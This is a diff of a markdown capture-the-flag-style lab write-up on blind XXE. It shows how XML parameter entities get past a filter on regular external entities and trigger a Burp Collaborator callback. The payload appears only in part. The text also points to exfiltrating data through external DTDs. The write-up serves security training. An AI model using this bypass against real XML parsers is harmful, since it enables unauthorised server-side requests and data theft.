@@ -1,17 +1,18 @@
 # Lab 04: Blind XXE via XML Parameter Entities
 
 ### 🎯 Objective
-Trigger an out-of-band (OAST) interaction with Burp Collaborator using a **Parameter Entity** to bypass basic filters that block regular external entities.
+Identify and exploit a blind XXE vulnerability by triggering an out-of-band (OAST) interaction with Burp Collaborator using **XML Parameter Entities**.
 
-### 🔍 Why Parameter Entities?
-In this lab, the application blocks standard external entities like `<!ENTITY xxe SYSTEM "...">`. However, it still allows **Parameter Entities**, which are identified by a percent sign (`%`) and are parsed differently by the XML engine.
+### 🔍 Vulnerability Analysis
+The application's XML parser is configured to block standard external entities. However, it fails to restrict **Parameter Entities**, which are specifically used within the Document Type Definition (DTD). This allows an attacker to bypass common security filters.
 
-### 🛠️ Exploitation Process
+### 🛠️ Exploitation Steps
 
-1. **The Bypass Payload:**
-   Instead of defining an entity to be used in the XML body, we define a parameter entity and immediately call it within the DTD.
+1. **The Bypass Technique:**
+   Since regular entities like `&xxe;` are filtered, we use a parameter entity defined with the `%` prefix. This entity is declared and invoked entirely within the DTD.
 
-   **Final XML Payload:**
+2. **The Payload:**
+   Insert the following block between the XML declaration and the root element:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [
@@ -23,24 +24,16 @@ In this lab, the application blocks standard external entities like `<!ENTITY xx
        <storeId>1</storeId>
    </stockCheck>
 
-    How it works:
+    Execution:
 
-        % xxe — Parametr entitisini yaradır.
+        Submit the POST request.
 
-        SYSTEM "http://..." — Sorğu atılacaq ünvanı müəyyən edir.
+        The XML parser processes the DTD, defines the %xxe parameter entity, and immediately executes the external request via %xxe;.
 
-        %xxe; — Bu, entitini DTD-nin daxilində çağırır (icra edir).
+🚩 Result & Verification
 
-    Verification:
+    Collaborator Logs: Successfully captured DNS and HTTP interactions from the target server.
 
-        Request-i göndər.
-
-        Collaborator tabına keç və "Poll now" et.
-
-        DNS və HTTP sorğularını görəcəksən.
-
-🚩 Result
-
-    Observation: Even though regular entities were blocked, the parser processed the parameter entity.
+    Impact: Confirmed that the server is vulnerable to OOB-XXE, which can be further leveraged to exfiltrate data using external DTDs.
 
     Status: ✅ Solved
